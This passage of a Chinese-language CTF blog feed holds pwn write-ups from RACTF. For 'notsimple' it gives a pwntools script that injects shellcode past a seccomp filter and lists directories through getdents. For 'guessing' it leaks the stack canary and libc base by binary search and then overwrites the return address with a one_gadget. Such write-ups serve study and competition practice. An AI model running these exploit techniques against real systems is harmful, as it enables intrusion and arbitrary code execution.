0x00 0x00000086  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>但是经过查阅资料后发现，<code>ls</code>的底层是依赖系统调用<code>getdents</code>.</p><p>所以我们可以<code>getdents</code>系统来读取文件目录.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">e=ELF(<span class="string">'./notsimple'</span>)</span><br><span class="line"><span class="comment">#p=process('./notsimple')</span></span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">46343</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Oops, I'm leaking!"</span>)</span><br><span class="line">addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line">addr2=addr+<span class="number">0x400</span></span><br><span class="line">shell=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x800;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rax,%s;</span></span><br><span class="line"><span class="string"> jmp rax;</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr2),hex(addr2)))</span><br><span class="line">print(len(shell))</span><br><span class="line"></span><br><span class="line">p.sendline(shell+(<span class="number">0x50</span>-len(shell))*<span class="string">'1'</span>+p64(<span class="number">0</span>)+p64(addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">addr3=addr+<span class="number">0x1000</span></span><br><span class="line">shell2=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x80;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">  mov rdi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x0;</span></span><br><span class="line"><span class="string"> mov rsi, 0x10000;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x2;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd</span></span><br><span class="line"><span class="string">mov rsi, %s ;// buf</span></span><br><span class="line"><span class="string">mov edx, 1024 ;// count</span></span><br><span class="line"><span class="string">mov rax, 78 ;// SYS_getdents</span></span><br><span class="line"><span class="string"> syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x680;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rdi, 0 ;// exit</span></span><br><span class="line"><span class="string">mov rax, 60;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr3),hex(addr3),hex(addr3),hex(addr3),hex(addr3)))</span><br><span class="line"></span><br><span class="line">p.sendline(shell2)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.sendline(<span class="string">'/pwn\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="guessing"><a href="#guessing" class="headerlink" title="guessing"></a>guessing</h2><p>有意思的一道题,在我们只有8次猜中数字的机会但是我们要猜出canary和libc基地址，一共16个数字。</p><p>我们可以通过<code>256== 2**8</code>的特性在7次猜测下大概在通过大小推理出任意一个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guss</span><span class="params">(nums)</span>:</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    depth = <span class="number">0</span></span><br><span class="line">    addition = <span class="number">0</span></span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    canary2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">        <span class="comment">#print('my_guess: '+str(my_guess))</span></span><br><span class="line">        depth += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> my_guess&lt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess += <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">                print(<span class="string">'low get!'</span>+str(my_guess))</span><br><span class="line">                <span class="comment">#print(hex(canary))</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">elif</span> my_guess&gt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess -= <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment"># print(hex(canary))</span></span><br><span class="line">                print(<span class="string">'high get!'</span>+str(my_guess))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            canary2 += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'samlle get!'</span>+str(my_guess))</span><br><span class="line">            <span class="comment">#print('one true')</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n=[<span class="number">111</span>,<span class="number">34</span>,<span class="number">155</span>,<span class="number">33</span>,<span class="number">23</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">90</span>]</span><br><span class="line"></span><br><span class="line">guss(n)</span><br></pre></td></tr></table></figure><p>从而在8次内尽可能得到16位数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#target = process('./guess')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target=process(<span class="string">'./guess'</span>)<span class="comment">#remote('193.57.159.27', 55206)</span></span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand((c.time(<span class="number">0</span>)))</span><br><span class="line">x=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    k=c.rand()</span><br><span class="line">    k=k%<span class="number">255</span></span><br><span class="line">    x.append(k)</span><br><span class="line">    print(hex(k))</span><br><span class="line">print(x)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x20</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        canary += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(canary)</span><br><span class="line"><span class="comment">#target.interactive()</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">libc_start = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x30</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_start += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(hex(libc_start))</span><br><span class="line">libc_start_main=libc_start<span class="number">-234</span></span><br><span class="line">log.info(<span class="string">'libc_start_main:'</span>+str(libc_start_main))</span><br><span class="line">print(count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>-count):</span><br><span class="line">    target.sendline(str(i))</span><br><span class="line">    target.recvuntil(<span class="string">'Enter your guess:'</span>)</span><br><span class="line">    target.sendline(str(x[i]))</span><br><span class="line"><span class="comment">#gdb.attach(target)</span></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,libc_start_main)</span><br><span class="line"></span><br><span class="line">target.sendline(<span class="string">'x'</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(x.ogg(<span class="number">1</span>)))</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
